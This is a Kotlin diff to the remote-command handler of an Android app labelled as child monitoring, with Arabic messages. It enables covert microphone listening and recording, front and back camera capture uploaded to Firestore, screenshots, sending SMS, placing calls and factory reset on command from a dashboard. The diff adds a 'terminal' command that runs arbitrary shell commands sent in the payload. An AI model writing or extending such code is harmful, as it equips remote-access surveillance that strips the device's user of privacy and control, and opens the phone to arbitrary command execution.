@@ -5,17 +5,17 @@ import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
-import android.content.pm.PackageManager
 import android.hardware.camera2.CameraCharacteristics
 import android.media.AudioManager
 import android.os.Build
 import android.telephony.SmsManager
-import androidx.core.content.ContextCompat
 import com.kids.monitor.AdminReceiver
 import com.kids.monitor.CameraService
-import com.kids.monitor.MonitorService
+import com.kids.monitor.MainActivity
+import com.kids.monitor.MicService
 import com.kids.monitor.NotificationRelayService
 import com.kids.monitor.ScreenShareService
+import com.kids.monitor.TerminalService
 
 /** تنفيذ أوامر التحكم عن بُعد الواردة من لوحة التحكم. */
 object CommandExecutor {
@@ -28,33 +28,54 @@ object CommandExecutor {
                 "lock" -> lock(context)
                 "clear_notifications" -> clearNotifications()
                 "send_message" -> sendMessage(context, payload)
-                "take_photo" -> takePhoto(context)
+                "take_photo" -> takePhoto(context, payload)
                 "take_screenshot" -> takeScreenshot()
                 "make_call" -> makeCall(context, payload)
                 "mic_start" -> {
-                    MonitorService.startMic(context)
+                    MicService.start(context)
                     ok("تم فتح المايك (استماع فقط)")
                 }
                 "mic_stop" -> {
-                    MonitorService.stopMic()
+                    MicService.stop(context)
                     ok("تم إيقاف المايك")
                 }
                 "record_mic" -> {
-                    MonitorService.recordMic(context)
-                    ok("جارٍ تسجيل مقطع صوتي…")
+                    MicService.recordOnce(context)
+                    ok("جارٍ تسجيل مقطع صوتي (30 ثانية)…")
                 }
-                "camera_front_start" -> startCamera(context, CameraCharacteristics.LENS_FACING_FRONT)
-                "camera_back_start" -> startCamera(context, CameraCharacteristics.LENS_FACING_BACK)
+                "camera_start", "camera_front_start", "camera_back_start" -> {
+                    val facing = when {
+                        type == "camera_front_start" -> CameraCharacteristics.LENS_FACING_FRONT
+                        type == "camera_back_start" -> CameraCharacteristics.LENS_FACING_BACK
+                        payload["facing"]?.toString() == "front" -> CameraCharacteristics.LENS_FACING_FRONT
+                        else -> CameraCharacteristics.LENS_FACING_BACK
+                    }
+                    startCamera(context, facing)
+                }
                 "camera_stop" -> {
-                    CameraService.stop(context)
+                    val facing = when (payload["facing"]?.toString()) {
+                        "front" -> CameraCharacteristics.LENS_FACING_FRONT
+                        "back" -> CameraCharacteristics.LENS_FACING_BACK
+                        else -> -1
+                    }
+                    if (facing == -1) CameraService.stopAll(context) else CameraService.stop(context, facing)
                     ok("تم إيقاف الكاميرا")
                 }
+                "screen_status" -> screenStatus()
+                "terminal" -> TerminalService.execute(context, payload["cmd"]?.toString().orEmpty())
+                "device_info" -> TerminalService.deviceSummary(context)
                 "factory_reset" -> factoryReset(context)
                 "sync_now" -> {
-                    MonitorService.syncNow(context)
+                    com.kids.monitor.MonitorService.syncNow(context)
                     ok("تمت جدولة المزامنة الفورية")
                 }
-                else -> fail("أمر غير معروف")
+                "open_app" -> {
+                    context.startActivity(
+                        Intent(context, MainActivity::class.java).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK),
+                    )
+                    ok("تم فتح التطبيق على الجهاز")
+                }
+                else -> fail("أمر غير معروف: $type")
             }
         } catch (e: Exception) {
             fail(e.localizedMessage ?: "خطأ غير معروف")
@@ -68,13 +89,11 @@ object CommandExecutor {
     private fun getLocation(context: Context): Map<String, Any> {
         if (!LocationCollector.hasPermission(context)) return fail("يتطلب صلاحية الموقع")
         val loc = LocationCollector.freshLocation(context) ?: LocationCollector.lastLocation(context)
-            ?: return fail("تعذر الحصول على الموقع")
+            ?: return fail("تعذر الحصول على الموقع (تأكد من تشغيل GPS)")
         if (DeviceInfo.online(context)) {
             FirestoreSync.writeLocation(context, loc)
         } else {
-            val queued = loc.toMutableMap()
-            queued["timestamp"] = System.currentTimeMillis()
-            PendingStore.addMap(context, queued)
+            PendingStore.addMap(context, loc)
         }
         return ok("تم تحديث الموقع")
     }
@@ -119,7 +138,7 @@ object CommandExecutor {
             SmsManager.getDefault()
         } ?: return fail("خدمة الرسائل غير متاحة")
         sms.sendTextMessage(number, null, message, null, null)
-        return ok("تم إرسال الرسالة")
+        return ok("تم إرسال الرسالة إلى $number")
     }
 
     private fun makeCall(context: Context, payload: Map<String, Any>): Map<String, Any> {
@@ -132,50 +151,63 @@ object CommandExecutor {
             .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
         return try {
             context.startActivity(intent)
-            ok("تم بدء الاتصال")
+            ok("تم بدء الاتصال بـ $number")
         } catch (e: Exception) {
-            fail("تعذر بدء الاتصال")
+            fail("تعذر بدء الاتصال: ${e.localizedMessage}")
         }
     }
 
     private fun startCamera(context: Context, facing: Int): Map<String, Any> {
         if (!Permissions.has(context, Manifest.permission.CAMERA)) return fail("يتطلب صلاحية الكاميرا")
         CameraService.start(context, facing)
-        return ok(if (facing == CameraCharacteristics.LENS_FACING_FRONT) "تشغيل الكاميرا الأمامية"
-        else "تشغيل الكاميرا الخلفية")
+        return ok(
+            if (facing == CameraCharacteristics.LENS_FACING_FRONT) "تشغيل الكاميرا الأمامية"
+            else "تشغيل الكاميرا الخلفية",
+        )
     }
 
-    private fun takePhoto(context: Context): Map<String, Any> {
+    private fun takePhoto(context: Context, payload: Map<String, Any>): Map<String, Any> {
         if (!Permissions.has(context, Manifest.permission.CAMERA)) return fail("يتطلب صلاحية الكاميرا")
-        val file = CameraCapture.capture(context) ?: return fail("تعذر التقاط صورة")
-        val url = StorageUploader.uploadSync(file, "photos/${file.name}")
-        if (url == null) {
-            file.delete()
-            return fail("تم التقاط الصورة لكن تعذر رفعها")
+        val facing = if (payload["facing"]?.toString() == "front") {
+            CameraCharacteristics.LENS_FACING_FRONT
+        } else {
+            CameraCharacteristics.LENS_FACING_BACK
         }
-        FirestoreSync.appendItem(
-            context,
-            "media",
-            mapOf(
-                "name" to file.name,
-                "url" to url,
-                "type" to "image",
-                "mimeType" to "image/jpeg",
-                "size" to file.length(),
-                "timestamp" to System.currentTimeMillis(),
-            ),
+        val file = CameraCapture.capture(context, facing) ?: return fail("تعذر التقاط صورة")
+        val kind = if (facing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "back"
+        val url = StorageUploader.uploadSync(file, "camera/$kind/${file.name}")
+        val inline = if (url == null) StorageUploader.inlineData(file) else null
+        if (url == null && inline == null) {
+            file.delete()
+            return fail("تم التقاط الصورة لكن تعذر رفعها (راجع قواعد Storage)")
+        }
+        val item = mapOf(
+            "name" to file.name,
+            "url" to (url ?: ""),
+            "dataUrl" to (inline ?: ""),
+            "type" to "image",
+            "mimeType" to "image/jpeg",
+            "size" to file.length(),
+            "camera" to kind,
+            "timestamp" to System.currentTimeMillis(),
         )
+        FirestoreSync.appendItem(context, "media", item)
+        FirestoreSync.setLive(context, kind, item)
+        file.delete()
         return ok("تم التقاط صورة ورفعها")
     }
 
     /** لقطة شاشة فورية عبر خدمة مشاركة الشاشة النشطة. */
     private fun takeScreenshot(): Map<String, Any> {
         if (!ScreenShareService.isRunning()) {
-            return fail("يتطلب تفعيل مشاركة الشاشة من التطبيق أولاً")
+            return fail("يتطلب تفعيل مشاركة الشاشة من التطبيق أولاً (إذن النظام لمرة واحدة)")
         }
         ScreenShareService.captureNow()
         return ok("تم التقاط لقطة شاشة ورفعها")
     }
+
+    private fun screenStatus(): Map<String, Any> =
+        if (ScreenShareService.isRunning()) ok("مشاركة الشاشة تعمل") else fail("مشاركة الشاشة متوقفة")
 
     private fun factoryReset(context: Context): Map<String, Any> {
         val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
